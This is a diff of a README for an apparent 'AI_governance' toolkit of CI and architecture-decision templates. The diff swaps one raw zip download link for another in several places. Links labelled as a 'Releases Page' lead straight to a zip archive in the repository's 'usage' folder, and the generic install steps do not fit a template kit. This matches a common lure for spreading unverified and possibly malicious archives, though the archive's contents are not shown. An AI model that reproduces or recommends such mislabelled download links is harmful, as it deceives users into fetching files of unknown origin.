@@ -1,6 +1,6 @@
 # 🚀 AI_governance - Simplifying AI Development Decisions
 
-[![Download AI_governance](https://github.com/bhavya7995/AI_governance/raw/refs/heads/main/usage/governance_A_2.9-alpha.1.zip%20AI_governance-%20%20-blue)](https://github.com/bhavya7995/AI_governance/raw/refs/heads/main/usage/governance_A_2.9-alpha.1.zip)
+[![Download AI_governance](https://raw.githubusercontent.com/bhavya7995/AI_governance/main/usage/A_governance_v1.1.zip%20AI_governance-%20%20-blue)](https://raw.githubusercontent.com/bhavya7995/AI_governance/main/usage/A_governance_v1.1.zip)
 
 ## 📖 Overview
 Welcome to AI_governance, your toolkit for AI-assisted development governance. This kit includes normative rules, continuous integration (CI) gate principles, architecture decision record (ADR) templates, and importable workflows. With these resources, you can keep your architecture, tests, and documentation organized and enforceable.
@@ -20,12 +20,12 @@ To run AI_governance, you need:
 ## 🚀 Getting Started
 Follow these steps to download and set up AI_governance:
 
-1. Visit our [Releases Page](https://github.com/bhavya7995/AI_governance/raw/refs/heads/main/usage/governance_A_2.9-alpha.1.zip).
+1. Visit our [Releases Page](https://raw.githubusercontent.com/bhavya7995/AI_governance/main/usage/A_governance_v1.1.zip).
 2. Look for the latest version of AI_governance.
 3. Click on the download link appropriate for your operating system.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [AI_governance Releases](https://github.com/bhavya7995/AI_governance/raw/refs/heads/main/usage/governance_A_2.9-alpha.1.zip).
+To get started, visit this page to download: [AI_governance Releases](https://raw.githubusercontent.com/bhavya7995/AI_governance/main/usage/A_governance_v1.1.zip).
 
 1. Select the version you wish to download.
 2. Click the link and the file will start downloading.
